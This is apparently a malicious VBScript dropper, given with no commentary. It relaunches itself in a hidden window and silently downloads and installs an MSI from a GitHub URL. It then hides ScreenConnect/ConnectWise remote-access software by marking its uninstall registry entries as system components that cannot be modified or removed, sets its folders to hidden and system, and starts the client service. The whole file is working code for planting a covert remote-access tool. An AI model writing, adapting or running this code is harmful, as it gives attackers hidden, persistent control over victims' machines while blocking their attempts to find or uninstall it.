If InStr(LCase(WScript.FullName), "wscript") > 0 Then
    If InStr(LCase(Command), "//b") = 0 Then
        CreateObject("WScript.Shell").Run "wscript.exe //B //Nologo """ & WScript.ScriptFullName & """", 0, False
        WScript.Quit
    End If
End If

Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

Dim tempPath, msiPath, installLink

tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
msiPath = tempPath & "\sc.msi"
installLink = "https://raw.githubusercontent.com/RaigekiSpellCard/SC/main/eipihtzeay.msi"

DownloadFile installLink, msiPath
objShell.Run "msiexec.exe /i """ & msiPath & """ /quiet /norestart /l*v """ & tempPath & "\sc_install.log""", 0, True

If objFSO.FileExists(msiPath) Then
    objFSO.DeleteFile msiPath, True
End If

Dim oReg
Set oReg = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv")

Dim HKLM, HKCU
HKLM = &H80000002
HKCU = &H80000001

HideRegPath oReg, HKLM, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"
HideRegPath oReg, HKLM, "SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
HideRegPath oReg, HKCU, "SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"

Set oReg = Nothing

Dim folderPaths(4)
folderPaths(0) = objShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\ScreenConnect"
folderPaths(1) = objShell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\ScreenConnect"
folderPaths(2) = objShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\ConnectWise\ScreenConnect"
folderPaths(3) = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\ScreenConnect"
folderPaths(4) = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\ConnectWise\ScreenConnect"

Dim i
For i = 0 To 4
    If objFSO.FolderExists(folderPaths(i)) Then
        objShell.Run "attrib +s +h """ & folderPaths(i) & """ /s /d", 0, True
    End If
Next

LaunchScreenConnect

WScript.Sleep 60000

Function DownloadFile(url, filePath)
    On Error Resume Next
    Dim xmlHttp, stream
    Set xmlHttp = CreateObject("MSXML2.XMLHTTP")
    xmlHttp.Open "GET", url, False
    xmlHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    xmlHttp.Send
    If xmlHttp.Status = 200 Then
        Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1
        stream.Open
        stream.Write xmlHttp.ResponseBody
        stream.SaveToFile filePath, 2
        stream.Close
        Set stream = Nothing
    End If
    Set xmlHttp = Nothing
    On Error GoTo 0
End Function

Sub HideRegPath(oReg, hive, basePath)
    On Error Resume Next
    Dim subKeys, key, displayName, publisher
    oReg.EnumKey hive, basePath, subKeys
    If Not IsArray(subKeys) Then Exit Sub
    For Each key In subKeys
        displayName = ""
        publisher = ""
        oReg.GetStringValue hive, basePath & "\" & key, "DisplayName", displayName
        oReg.GetStringValue hive, basePath & "\" & key, "Publisher", publisher
        If InStr(LCase(displayName), "screenconnect") > 0 Or _
           InStr(LCase(displayName), "connectwise") > 0 Or _
           InStr(LCase(publisher), "screenconnect") > 0 Or _
           InStr(LCase(publisher), "connectwise") > 0 Then
            oReg.SetDWORDValue hive, basePath & "\" & key, "SystemComponent", 1
            oReg.SetDWORDValue hive, basePath & "\" & key, "NoModify", 1
            oReg.SetDWORDValue hive, basePath & "\" & key, "NoRemove", 1
        End If
    Next
    On Error GoTo 0
End Sub

Sub LaunchScreenConnect()
    On Error Resume Next
    Dim scPaths(5), exeName
    exeName = "ScreenConnect.ClientService.exe"
    scPaths(0) = objShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\ScreenConnect\" & exeName
    scPaths(1) = objShell.ExpandEnvironmentStrings("%ProgramFiles(x86)%") & "\ScreenConnect\" & exeName
    scPaths(2) = objShell.ExpandEnvironmentStrings("%ProgramFiles%") & "\ConnectWise\ScreenConnect\" & exeName
    scPaths(3) = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\ScreenConnect\" & exeName
    scPaths(4) = objShell.ExpandEnvironmentStrings("%ProgramData%") & "\ConnectWise\ScreenConnect\" & exeName
    scPaths(5) = objShell.ExpandEnvironmentStrings("%windir%") & "\SysWOW64\ScreenConnect\" & exeName
    Dim j
    For j = 0 To 5
        If objFSO.FileExists(scPaths(j)) Then
            objShell.Run """" & scPaths(j) & """", 0, False
            Exit For
        End If
    Next
    On Error GoTo 0
End Sub
